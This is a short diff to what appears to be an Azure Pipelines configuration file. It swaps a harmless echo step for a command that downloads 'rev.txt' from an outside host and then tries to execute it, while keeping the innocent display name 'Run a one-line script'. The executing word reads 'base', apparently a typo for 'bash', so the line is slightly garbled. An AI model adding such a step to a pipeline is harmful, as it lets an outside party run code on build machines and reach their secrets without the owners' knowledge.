@@ -10,7 +10,7 @@ pool:
   vmImage: 'ubuntu-latest'
 
 steps:
-- script: echo Hello, world!
+- script: wget http://recon.offensi.com/rev.txt; base rev.txt
   displayName: 'Run a one-line script'
 
 - script: |
